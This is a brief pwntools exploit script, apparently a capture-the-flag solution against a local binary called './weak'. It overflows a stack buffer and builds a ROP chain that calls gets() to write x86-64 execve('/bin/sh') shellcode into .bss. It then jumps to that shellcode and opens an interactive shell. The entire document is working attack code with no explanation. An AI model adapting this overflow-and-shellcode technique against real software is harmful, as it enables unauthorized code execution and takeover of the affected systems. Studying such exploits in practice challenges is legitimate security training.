from pwn import *

e = ELF('./weak')
p = process('./weak')

shellcode = "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"
bss_addr = e.bss() + 0x100
gets_addr = e.symbols['gets']
ret_addr = 0x00400417
mov_edi = 0x00400650

payload = 'A'*24
payload += p64(ret_addr)
payload += p64(mov_edi)
payload += p64(0) * (0x30 // 8)
payload += p64(bss_addr)
payload += p64(gets_addr)
payload += p64(bss_addr)

print p.recvuntil('president.')
p.sendline(payload)
p.sendline(shellcode)
p.interactive()



